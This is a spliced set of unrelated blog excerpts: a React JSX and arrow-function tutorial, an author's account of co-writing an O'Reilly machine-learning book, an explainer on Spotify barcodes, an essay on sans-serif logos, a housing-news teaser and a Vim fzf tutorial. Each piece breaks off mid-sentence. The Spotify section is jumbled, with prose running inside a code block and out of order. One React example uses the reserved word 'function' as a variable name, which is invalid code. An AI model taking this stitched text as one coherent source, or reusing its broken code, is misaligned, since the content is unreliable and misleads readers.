important? In a React component, we have a <code>props</code> object that gets passed in a parent component.</p><p>Consider we have a Page with a <code>Layout</code> Component that renders a <code>Bio</code>. The Bio component takes on a <code>name</code>, <code>age</code>, and <code>jobTitle</code> prop. If we are in that parent component and have an object handy (like the <code>person</code> object), we can “spread” it into the component. In this example, we will be spreading these props into the <code>Bio</code> component:</p><div data-language="jsx"><pre><code><span>const</span> <span>BioPage</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span>
 <span><span><span>&lt;</span><span>Layout</span></span><span>&gt;</span></span><span>
  </span><span><span><span>&lt;</span><span>Bio</span></span> <span><span>{</span><span>...</span><span>person</span><span>}</span></span> <span>/&gt;</span></span><span>
 </span><span><span><span>&lt;/</span><span>Layout</span></span><span>&gt;</span></span>
<span>)</span></code></pre></div><p>This would be equivalent to this:</p><div data-language="jsx"><pre><code><span>const</span> <span>BioPage</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span>
 <span><span><span>&lt;</span><span>Layout</span></span><span>&gt;</span></span><span>
  </span><span><span><span>&lt;</span><span>Bio</span></span> <span>name</span><span><span>=</span><span>{</span>person<span>.</span>name<span>}</span></span> <span>age</span><span><span>=</span><span>{</span>person<span>.</span>age<span>}</span></span> <span>jobTitle</span><span><span>=</span><span>{</span>person<span>.</span>jobTitle<span>}</span></span> <span>/&gt;</span></span><span>
 </span><span><span><span>&lt;/</span><span>Layout</span></span><span>&gt;</span></span>
<span>)</span></code></pre></div><p>You can read more about how this works in the <a href="https://reactjs.org/docs/jsx-in-depth.html#spread-attributes">React Docs</a>.</p><h2>Understanding Arrow functions</h2><p>When defining a function, I’ve found arrow functions are the norm in React. I’m not saying you’ll never see the function keyword. I still see the function keyword from time to time. I recommend getting used to seeing arrow functions and understanding what you’re seeing. It’ll help you improve understanding React code, particularly with callbacks within <code>Array.prototype.map()</code> and <code>Array.prototype.filter()</code>, which we will discuss a bit later.</p><p>I’m not going to go over all the intricacies of arrow functions in depth. There are plenty of JavaScript bloggers who will do a much better job at that than I would. You can start off at the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Functions/Arrow_functions">MDN Docs</a> to see some of the motivations for why this was created. But again, I want you to know what you’re looking at.</p><h3>The syntax:</h3><p>Arrow functions are anonymous functions that you can store in a variable (what I frequently do).</p><p>You have the parentheses, where you have some optional parameters, an arrow that’s an equal sign and then a greater than sign (=&gt;), and then some curly braces.</p><div data-language="js"><pre><code><span>const</span> <span>someVarFunction</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  
<span>}</span></code></pre></div><p>The parameters take on many formats, depending on the number of parameters you have. Here’s the quick cheat sheet:</p><ol><li>0 or more than one parameter = yes you need parentheses</li><li>1 parameter = no parentheses needed</li></ol><div data-language="js"><pre><code>
<span>const</span> <span>function</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>{</span>
  
<span>}</span>


<span>const</span> <span>function2</span> <span>=</span> <span>(</span><span>param1<span>,</span> param2</span><span>)</span> <span>=&gt;</span> <span>{</span>
  
<span>}</span>


<span>const</span> <span>function3</span> <span>=</span> <span>param1</span> <span>=&gt;</span> <span>{</span>
  
<span>}</span></code></pre></div><p>Understanding that I won’t see any parentheses if there’s only one parameter alleviated so much of my confusion. It helped me understand what I saw when I saw callbacks in the <code>.map()</code> method.</p><p>The first way to look at an arrow function is if you have an explicit return. Consider the below example. We have curly braces, some logic happening where we reformat the data and store it in a variable, and then returning some JSX.</p><div data-language="jsx"><pre><code><span>const</span> <span>renderComponent</span> <span>=</span> <span>content</span> <span>=&gt;</span> <span>{</span>
 <span>const</span> data <span>=</span> <span>formatData</span><span>(</span>content<span>)</span>

 <span>return</span> <span>(</span>
  <span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>"</span>wrapper<span>"</span></span><span>&gt;</span></span><span>
   </span><span><span><span>&lt;</span><span>Component</span></span> <span><span>{</span><span>...</span><span>data</span><span>}</span></span> <span>/&gt;</span></span><span>
  </span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span>
 <span>)</span>
<span>}</span></code></pre></div><p>There is one of key part to notice. In this function, we are doing MORE than returning the component. We are formatting some data with something we pass in, and then we are returning a component with that new data.</p><p>But what if you don’t need to format any data, and you’re only returning one line of JSX? You can do that in one line, remove the <code>return</code> keyword, and the curly braces! This formatting is an <strong>implicit return</strong>. JavaScript knows when you format it this way that all you’re doing is returning something.</p><div data-language="jsx"><pre><code><span>const</span> <span>ParentComponent</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span><span><span>&lt;</span><span>Component</span></span> <span>/&gt;</span></span></code></pre></div><p>This syntax is saying, “Hey, your only job here is to return this single line component.”</p><p>You don’t see that very often in React. How often do you have a component that only returns one thing that neatly fits into one line of code? What you’ll see more often is an implicit return without curly braces or the return keyword, but wrapped in parentheses because it’s returning multiple lines of code.</p><div data-language="jsx"><pre><code><span>const</span> <span>ParentComponent</span> <span>=</span> <span>(</span><span>)</span> <span>=&gt;</span> <span>(</span>
 <span><span><span>&lt;</span>div</span> <span>className</span><span><span>=</span><span>"</span>wrapper<span>"</span></span><span>&gt;</span></span><span>
  </span><span><span><span>&lt;</span><span>Component</span></span> <span>/&gt;</span></span><span>
 </span><span><span><span>&lt;/</span>div</span><span>&gt;</span></span>
<span>)</span></code></pre></div><p>This syntax says, “Hey, your only job here is to return multiple lines of JSX.”</p><p>Once I understood the differences between the formatting, it became a lot clearer what I was looking at when I was reading the code.</p><h2>Understanding Destructuring</h2><p>Destructuring is a more straightforward way to unpack arrays or objects into unique variables.</p><p>Consider the object from the previous example:</p><div data-language="js"><pre><code><span>const</span> person <span>=</span> <span>{</span>
 name<span>:</span> <span>'Lindsey'</span><span>,</span>
 age<span>:</span> <span>30</span><span>,</span>
 jobTitle<span>:</span> <span>'Senior UI Engineer'</span><span>,</span>
<span>}</span></code></pre></div><p>What if we wanted to have distinct variables for every property in that object for ease of use. For example, saying <code>name</code> is way easier than saying <code>person.name</code>.</p><p>We could do this:</p><div data-language="js"><pre><code><span>const</span> name <span>=</span> person<span>.</span>name
<span>const</span> age <span>=</span> person<span>.</span>age
<span>const</span> jobTitle <span>=</span> person<span>.</span>jobTitle</code></pre></div><p>Assigning variables works, but if this object had more than 3 properties, it could take up a lot of space to name every variable. This situation is when destructuring comes in handy.</p><p>The …</p></div></div></div>

	  <p><strong>tl;dr</strong> - I co-authored an O’Reilly book with my colleagues <a href="https://twitter.com/lak_gcp" target="_blank">Lak</a> and <a href="https://www.linkedin.com/in/munnm/" target="_blank">Mike</a>! You can <a href="https://www.oreilly.com/library/view/machine-learning-design/9781098115777/" target="_blank">order it here</a> and 100% of the royalties go to <a href="https://girlswhocode.com/" target="_blank">Girls Who Code</a>. This post is about the writing process.</p>

<h3 id="deciding-to-write">Deciding to write</h3>

<p>Back in January of this year, Lak graciously reached out to me asking if I was interested in co-writing an O’Reilly book on machine learning. As I read the email, my reaction was almost an immediate no because:</p>

<ul>
  <li>It sounded like something that would take a lot of time.</li>
  <li>With a quickly evolving field like ML, wouldn’t a book be obsolete before it hit the shelves?</li>
</ul>

<p>I let Lak’s request sit in my inbox for a few days even though I was sure I had made up my mind, because saying no to projects is much harder than saying yes. A few days later on a long car ride with my fiancé, I mentioned the book offer in passing.</p>

<blockquote>
  <p>“You have an opportunity to write a book and you’re saying <em>no</em>?” he said, nearly pulling off the road.</p>
</blockquote>

<p>I suppose I had considered this offer as more of a <strong>burden</strong>, but from his perspective it was an <strong>opportunity</strong>. Ok, he wouldn’t be the one writing it, but he has <a href="https://www.amazon.com/Building-Embedded-Linux-Systems-Techniques-dp-0596529686/dp/0596529686" target="_blank">written</a> an O’Reilly book before!</p>

<p>It would no doubt be hard, but it also provided a chance to learn a lot along the way and have a book at the end of it. With his advice in mind, I decided to learn more about the book before saying no. The plan for the book was to catalog a series of patterns, each of which would outline a common challenge in ML and provide some approaches for solving it. I was intrigued, but some doubts started to creep in as I read through the pattern ideas:</p>

<ul>
  <li>
    <p>I was very familiar with some, but much less so with others. Didn’t I need to have all this knowledge in my head before writing for this to work?</p>
  </li>
  <li>
    <p>Why me? Why was I qualified to do this? Objectively, I have created a lot of ML content over the years to educate app developers, data scientists, and customers. I’d like to think I’m a decent writer, but a book? That seemed like a different beast, and I wasn’t sure I was the best person for the job.</p>
  </li>
</ul>

<p>There can always be a million reasons not to do something, but I ultimately decided to ignore them all and give it a try.</p>

<h3 id="starting-with-an-idea">Starting with an idea</h3>

<p>This happened before I joined the project, so I asked Lak what he did before reaching out to O’Reilly with the idea for the book. Publishers get cold proposals all the time, so it helps if you can clearly communicate what the book will be about and show that you know what you will be writing about.</p>

<p>In our case, Lak wrote a couple of blog posts on machine learning design patterns (<a href="https://medium.com/swlh/ml-design-pattern-1-transform-9e82ccbc3209">Transform</a> and <a href="https://towardsdatascience.com/ml-design-pattern-2-checkpoints-e6ca25a4c5fe">Checkpoints</a>) to gauge whether readers were interested in this idea. They were, but he realized that readers’ interest was very much in how to implement, adapt, and extend these patterns. He also did a talk on the topic at a couple of conferences and discovered that conference attendees were a bit different – they needed a clear explanation of the reason to use the pattern and a prescriptive approach to addressing the problem. In other words, readers who knew the pattern beforehand wanted a technical manual, while conference attendees (who were being introduced to the pattern for the first time) wanted to know why the pattern matters. This helped him write the next set of blog posts, where he started with a crisp problem statement, a canonical solution, and a couple of variations.</p>

<p>Once he had a good idea of how to communicate ML design patterns, Lak reached out to an O’Reilly editor with a short message:</p>

<blockquote>
  <p>I have a <a href="https://link.medium.com/7BSgxXdts1">list</a> of about 20 machine learning design patterns that I want to write about. Do you think they would do well as a book? If so, I can see about finding a co-author who would be interested in expanding on these…</p>
</blockquote>

<p>The editor replied that since O’Reilly has a solid franchise in design patterns, he was very interested. He was assigned an acquisitions editor who would work with us to craft the actual proposal. And that’s when Lak reached out to me to see if I was interested in co-authoring.</p>

<h3 id="building-an-outline">Building an outline</h3>

<p>I knew nothing about writing a book going into this, and my first question was: how will we split up the work? Will we alternate paragraphs, sections, chapters, words? I’m sure this varies for every book with multiple authors. We decided to split work by sections. In our case, each section was a design pattern and each chapter had 3-6 patterns. We started by making an outline, with an initial list of 20 patterns.</p>

<p>Chapters in our book are organized by different phases in a typical machine learning workflow. We first determined the topic for each chapter, and then came up with the patterns we wanted to be included in it. In the outline, each pattern had a 1-2 sentence description. It took a few iterations of adding and removing patterns and moving some between chapters before we had something we were happy with. We finished this process with a total of 30 patterns split across 6 chapters, with 2 additional chapters for an intro and conclusion. This brought us to the end of February.</p>

<h3 id="submitting-a-book-proposal">Submitting a book proposal</h3>

<p>The first step in the publishing process for many books is writing a proposal and submitting it to an acquisitions editor. Acquisitions editors are in charge of reviewing proposals, providing feedback, and deciding whether a proposal will move to the next stage in the approval process. They also work on overall content strategy, deciding which topics they want to cover. Sometimes people reach out to them cold, and other times these editors may proactively reach out to prospective authors.</p>

<p>The proposal (which includes the outline, but also comparisons with existing titles, and who the intended audience is) went through a few rounds of feedback (which is where I joined the process), including detailed technical feedback, before getting approved. The acquisitions editor focuses on acquiring new content, so once ours got approved we moved to the next step in the process which was working with a development editor. This person was our main point of contact throughout the writing process – more on that in the next section.</p>

<p>I recently had a great conversation with our acquisitions editor, where I learned a lot more about the publishing industry and how this all works. One thing from this conversation especially stood out: she mentioned she <em>rarely</em> receives a cold book proposal from a woman, and she gets many cold proposals each day. I’m sharing this data (with her permission) in hopes that it encourages more women with book ideas to just go for it. Reach out! You’ve got nothing to lose. If your proposal gets rejected, you’ll likely still get some feedback in the process.</p>

<h3 id="writing-time">Writing time</h3>

<p>I assumed we’d begin at the beginning, but we started by writing Chapter 2. Chapter 1 didn’t have any patterns – it was meant to be an overview of the entire book, explain our goals, and set the stage for the intended audience. Without anything written yet this would be hard to write, so we got right into patterns by starting with Chapter 2. Before sitting down to write this chapter, we took our short Chapter 2 outline and worked together to expand it. This is something we did before every chapter, with the goals of:</p>

<ul>
  <li>Ensuring the three of us had the same understanding of each pattern</li>
  <li>Agreeing on what should and shouldn’t be covered</li>
  <li>Splitting up the writing by pattern</li>
</ul>

<p>Early on in the outline process, we had decided each pattern should follow the same structure. If you’re reading the book, you’ll notice that every pattern is split into the following:</p>

<ul>
  <li><strong>Problem</strong>: describes the ML challenge a pattern addresses</li>
  <li><strong>Solution</strong>: describes one approach to solving the problem, including code snippets and recommended tooling for solving the problem</li>
  <li><strong>Tradeoffs and Alternatives</strong>: extended discussion on the pattern, including tools not covered in the Solution section, potential gotchas, and related solutions</li>
</ul>

<p>Having a structure for each section was extremely useful in ensuring consistency throughout the book.</p>

<p>After outlining Chapter 2 in detail, I had two patterns assigned to me and it was finally time to write. I wish I could tell you this is the part where I sat down at my desk, closed the door, and let the insights flow onto the page. This is how I’d always imagined book writing went. For better or worse (and maybe because the outside world went into chaos while this was happening), my process went more like this:</p>

<blockquote><div lang="en" dir="ltr"><p>My writing process:</p><p>* Write 2 sentences<br>* My glasses are splotchy, where are the lens wipes?<br>* Edit the last sentence I wrote<br>* Research the latest keyboards<br>* Write another 2 sentences<br>* Refill water, clean the counter<br>* Stare at my now perfect paragraph<br>* Open Twitter</p></div>— Sara Robinson (@SRobTweets) <a href="https://twitter.com/SRobTweets/status/1244312122613473281?ref_src=twsrc%5Etfw">March 29, 2020</a></blockquote>


<p>It wasn’t a very efficient way to start, but it got the job done and over time my process improved. I also quickly debunked my initial question:</p>

<p><em>Didn’t I need to have all this knowledge in my head before writing for this to work?</em></p>

<p>Even if I did have experience implementing a particular pattern, I couldn’t write only what I already knew. I had to do a considerable amount of research before I started writing the bulk of each pattern to find out:</p>

<ul>
  <li>What writing on this topic already existed?</li>
  <li>Are there any important research papers that cover this?</li>
  <li>What tools are available for solving this pattern?</li>
</ul>

<p>With all this research I started to have some doubts. If I was just collating information from various sources, was I providing anything useful? Then I thought about some of my favorite non-fiction books and realized most of them work by:</p>

<p><em>Presenting existing, relevant information + adding a unique angle</em></p>

<p>I’ve met with a lot of customers and seen production use of ML, and I’ve also built demos to help developers understand how to use different ML tools. Turns out I did have a unique angle! Before writing I did a lot of reading to make sure I fully understood the ins and outs of the pattern. Then I had enough information to write. I still wouldn’t say the words flowed at this point, but I did slowly get …</p></div></div>

This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>

They are so dense. I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a “media reference” is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to.

</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

If you were to put 100 financial or tech companies’ logos next to each other, the old logo would be easy to find at a glance.</p><p>If you put the new one in the same 100 logos pile, it would drown in the sea of sameness.</p><h2>Sans serif invasion</h2><p>There is a trend in logo design that started around 2017-2018. It’s as if many companies decided that being unique was a handicap and that it was better to be like everyone else. Or at least, that’s how it feels to me.</p><p>The trend started with fashion logos. Many iconic fashion companies ditched their recognizable logos and switched to a bland and very similar version of a sans serif font.</p><p>The technology sector followed soon after.</p><figure id="w-node-519323ea72d8-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51d96d2b8eae559c71d90_tech-fashion-logos-sans-serif.png" loading="lazy" alt=""></p></figure><p>All the quirks, peculiarities, and idiosyncrasies of both tech and fashion logos were dropped and replaced with a simple sans serif font.</p><p>It looked like two huge industries decided to use the services of one designer, and not a particularly inventive one at that.</p><p>The tech industry is in slightly better shape because they didn’t go all in, and at least they kept the colors. With the colors, there’s at least <em>some </em>variability:</p><figure id="w-node-1efc3a7d060a-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51dc4daea171c45c758db_tech-logos-color.png" loading="lazy" alt=""></p></figure><p>Variability in new fashion logos, in full color:</p><figure id="w-node-b31dea70a84e-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51dd2ab19486dcee8bcea_fashion-logos-color.png" loading="lazy" alt=""></p></figure><h3>Serif and sans serif—what’s the difference?</h3><p>First, what’s the difference between serif and sans serif fonts?</p><figure id="w-node-7e6a894d6cf3-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51e06556217fb8d809964_serif-sans-serif.gif" loading="lazy" alt=""></p></figure><p>The small features on the ends of strokes in some fonts are known as ‘serifs’.</p><p>Fonts without those small features are called ‘sans serif’ (<em>‘sans’</em> means <em>‘without’</em> in French).</p><p>Sans serifs are missing a few of the typical anatomical features (serifs, spurs, swashes and other flourishes). Because of that, this typeface lacks the level of detail and design differentiation that serif typefaces can have.</p><p>While the simplicity of sans serif fonts makes them readable and versatile, it has its drawbacks. Without additional details and features, sans serif fonts have far fewer options for differentiation. While you can vary things like the height, weight, and slant, sans serif fonts simply have fewer features to work with than their more intricate fellow fonts.</p><p>This results in logos that look very similar. Gone are all the elaborate little details of the previous era.</p><p>When you add brands’ tendency to go black-and-white, you end up with a sea of logo sameness which is the opposite of what logos should be.</p><p>The purpose of a logo is to be instantly recognizable, different, memorable, and, if possible, to refer to the brand’s values. Blending into everyone else’s achieves none of these things.</p><h3>Sans serif history</h3><p>Sans serif lettering and fonts, first created in 1816, were popular for their clarity and legibility at a distance in advertising and display use when printed very large or small.</p><p>Because sans serif type was often used for headings and commercial printing, many early sans serif designs did not feature lowercase letters.</p><p>Simple sans serif capitals, without the use of lowercase, became very common in uses such as tombstones of the Victorian period in Britain.</p><p>Also, a significant reason for serif faces in the older days of imprecise letterpress and less consistent paper surface sizing was to compensate for ink spread and aberrations. Serifs on the fonts helped in cases where corners would otherwise fail to fully imprint.</p><h2>Possible reasons</h2><p>What are the possible reasons for this sans serif trend taking over? And why do hardly any of them matter?</p><h3>‘Modern utility’</h3><p>Branding specialists point to the practical benefits of what they call the ‘modern utility’ of sans serif typefaces. Cleaner and more legible, they are better suited to a variety of media and work particularly well online. The purity of these fonts allows the brands to be an empty vessel, ready to accommodate rapidly shifting trends.</p><p><strong>Counterpoint:</strong> That may be true, but isn’t the whole value of a brand to <em>not</em> be an empty vessel? The big brands have worked decades for their identity and recognition, only to throw most of it away?</p><h3>Simplification</h3><p>Another reason cited by brand specialists is that it’s a natural step for brands to take as they grow from scrappy startups into established brands. The goals have shifted from making noise and standing out to being a trusted, dependable part of people’s everyday lives. That heartfelt personality and idiosyncrasy that defined a brand as they started out, and won over their early adopters, can be a limitation as they aim for broad appeal and bigger revenue.</p><p><strong>Counterpoint:</strong> Simplification as a reason to blend in for broad appeal? I don’t buy it. Logos should be simple, yes, but they should be simple in a memorable way. Think more in terms of Nike swoosh (simple, memorable),&nbsp; and less in a one-size-fits-all sans serif font.</p><h3>Brands are more than logos now</h3><p>People at the head of these powerful brands know that they are not defined by their logo anymore but by the product or service they provide. They are strong thanks to what they allow <em>you</em> to do with them.</p><p>Before, logo designers would look for a ‘concept’ when designing a logo. That is not necessary anymore: <em>The brand is the concept</em>.</p><p>Their thinking goes that logos may look similar, but what they offer is completely different and effective, and that’s what ultimately counts for the consumer.</p><p>As some brands become words (or even better, verbs) in our daily language (to Google, to Uber, to Skype), they have a lesser need for a recognizable logo. Many of those brands now spend on designing custom typefaces instead of logos: a custom typeface becomes their recognizable voice on every platform or device.</p><p><strong>Counterpoint:</strong> Some big brands may indeed have a lesser need for a very distinct logo but that doesn't mean that they should get rid of an important differentiator. You don’t see Nike replacing their swoosh logo with sans serif <strong>NIKE</strong> text. If you have something valuable that you <em>can</em> live without, it doesn’t mean that you <em>must</em>.</p><h3>Readability</h3><p>One of the main reasons for the sans serif logo trend is readability. Especially on mobile, but everywhere else as well: from huge billboards to tiny footer links at the bottom of mobile websites.</p><p>After all, that’s the very reason why sans serif fonts were invented: for better readability in advertising headlines.</p><p><strong>Counterpoint:</strong> Readability is obviously important. Mobile too—it’s where everything happens nowadays. But this is becoming less of an issue with improvements in technologies like retina displays and 4k screens becoming popular.</p><figure id="w-node-38988d1753c7-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51e96e07b893538cbb00b_sans-serif-logos-on-iphone-11.png" loading="lazy" alt=""></p><figcaption>Here’s how a bunch of logos looks on my iPhone 11</figcaption></figure><p>If it’s easy to fit 30 decently looking logos on one-third of a phone screen, it should be trivial to make one logo, however quirky, look perfect on mobile.</p><p>Revolut seems to be torn here.

Don’t throw away what the brand has been working on for decades.</p><p>Otherwise, you may end up in a situation where you could slap any logo on any product and hardly anyone would notice a difference:</p><figure id="w-node-1f59c0278e26-27e1f180"><p><img src="https://uploads-ssl.webflow.com/5f1b01fee505292d2d6a6979/5fb51fac8ae18b830d998184_sans-serif-bags.jpg" loading="lazy" alt=""></p><figcaption>One of these bags is real.</figcaption></figure></div></div>]]>

<p>This week on The Weekly Digs: Is an “Eviction Tsumami” looming in 2021? The U.S. economy has only recovered half the 22 million jobs lost during 2020; meanwhile, stimulus checks and support for unemployed is drying up fast. On another note, the housing market in the U.S. continues to be red hot. This and more, below the fold.</p>

<p>If you never heard of <a href="https://github.com/junegunn/fzf">fzf</a>, it is a very
handy general-purpose command-line fuzzy finder. Besides command-line, it is
also a popular Vim plugin. If you’re wondering, a fuzzy finder is a tool that
helps you find what you’re looking for without needing to write the full name.</p>
<p>As a Vim user, I am always obsessed with doing a thing in the fewer keystrokes
as possible. Having the ability to open a file in Vim quickly is super useful to
me, and you will see why soon.</p>
<p>But, did you know that this fuzzy finder - fzf, can do a lot more than you
thought? Oh yeah, the fuzzy search is just the tip of the iceberg here.
It is like wine; the more you leave it on your computer, the more flavor and
sweetness it accumulates from that command-line. Let’s dive in and find out how
you can increase your productivity with fzf inside Vim.</p>
<h2 id="starting-off"><a href="#starting-off" aria-label="starting off permalink"></a>Starting off</h2>
<p>To be able to do the things I am doing in this blog post, you will need a couple of
plugins. If you’re not using <a href="https://github.com/junegunn/vim-plug">vim-plug</a>
for installing other Vim plugins, then you are missing out. Go ahead and set
that up, and you can add the following:</p>
<div data-language="vim"><pre><code>Plug <span>'junegunn/fzf'</span><span>,</span> <span>{</span> <span>'do'</span><span>:</span> <span>{</span> <span>-</span><span>&gt;</span> fzf#<span>install</span><span>(</span><span>)</span> <span>}</span> <span>}</span>
Plug <span>'junegunn/fzf.vim'</span></code></pre></div>
<p>Then, install these plugins with <code>:PlugInstall</code> or use this shortcut I use:</p>
<div data-language="vim"><pre><code>
nnoremap <span>&lt;</span><span>silent</span><span>&gt;</span><span>&lt;</span>leader<span>&gt;</span><span>1</span> <span>:</span><span>source</span> ~<span>/</span><span>.</span>vimrc \| <span>:</span>PlugInstall<span>&lt;</span>CR<span>&gt;</span></code></pre></div>
<p>You can then press your leader key and number 1 to install and apply all the
changes in your <code>.vimrc</code>.</p>
<p>Now, to the coolest part!</p>
<h2 id="the-magic-finder"><a href="#the-magic-finder" aria-label="the magic finder permalink"></a>The magic finder</h2>
<p>Everything we need is installed, and we can get to the practical part. As we
said before, fzf is a fuzzy finder, a file selector if you want. Let’s try
out that feature right off. To get the file picker opened, type <code>:Files</code> in
a Vim session. You should get something like this:</p>
<p><span>
      <span></span>
  <img alt="Open :Files" title="Open :Files" src="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/fcda8/open-files.png" srcset="https://pragmaticpineapple.com/static/47be299b0a37790ebdd8396d20b872fa/12f09/open-files.png 148w,

<p>What happened is fzf opened a small window at the bottom showing files in our
directory. If you look at the newly opened window, you will see the list of
files, and the <strong>preview</strong> of the currently selected file on the right
of the window. So you got your files on the left and their preview on the
right. Are you already impressed as I was? Cool, let’s move on.</p>
<p>If you don’t like the window, you can fine-tune easily with fzf customization
options. But if you want any fzf command in fullscreen, you can append <code>!</code> at
the end of the command. For example, let’s do <code>:Files!</code> and you should see the
following:</p>
<p><span>
      <span></span>
  <img alt="Open :Files! in fullscreen" title="Open :Files! in fullscreen" src="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/fcda8/open-files-fullscreen.png" srcset="https://pragmaticpineapple.com/static/71e5fe325ab9a32de02f08763196d067/12f09/open-files-fullscreen.png 148w,

    </span></p>
<p>But, I don’t use <code>:Files</code> that often. As a matter of fact, I only use
<code>:GFiles</code> command by fzf. <code>:GFiles</code> will open a file picker for your Git files,
ignoring ones in the <code>.gitignore</code>. Using it is pretty neat in JavaScript
projects where <code>node_modules</code> files tend to kill the mood when running
<code>:Files</code>. Let us compare the same project with <code>:Files</code> and <code>:GFiles</code> commands:</p>
<p><span>

<p>
  Yuck! `node_modules` everywhere.
</p>
<p><span>
      <span></span>

<p>
  Ah, that's better.
</p>
<p>Notice the difference? It feels like I just dropped a heavy backpack off my
back by not having those <code>node_modules/**</code> files popping up. Anyway, let’s see
this bad boy in action when searching for files to edit.</p>
<p><img src="https://pragmaticpineapple.com/5a84a887e91f3aea28f8692bcc518fc0/gfiles-in-action.gif" alt=":GFiles in action GIF"></p>
<p>That’s it, and it is looking pretty good. Only thing I dislike about using <code>:GFiles</code> is
that it won’t include your new files unless you add them to the Git index with
<code>git add</code>. Also, I’d like some syntax highlighting to be there out of the box
when previewing files, but we will cover that in another blog post. In the
meantime, consider subscribing to the <a href="https://pragmaticpineapple.com/improving-vim-workflow-with-fzf/newsletter">newsletter</a> to get similar
posts like this.</p>
<p>To sum up, fzf is useful and quick as a flash when searching for files. And, as
Drake below says, resort to using <code>:GFiles</code> or try to configure <code>:Files</code> to
ignore certain files and paths.</p>
<p><span>
      <span></span>
  <img alt="Drake fzf choices - go with :GFiles instead of :Files" title="Drake fzf choices - go with :GFiles instead of :Files" src="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/41099/drake-no-files-yes-gfiles.jpg" srcset="https://pragmaticpineapple.com/static/643d1c18c9fd8e42484fcaffaa4d99eb/a80bd/drake-no-files-yes-gfiles.jpg 148w,

    </span></p>
<p>To make this super fast for you, you can create a shortcut. I open <code>:GFiles</code>
with CTRL + p. I got left with this in my muscle memory from the legendary
<a href="https://github.com/kien/ctrlp.vim">ctrlp</a> plugin. To have <code>:GFiles</code> wired
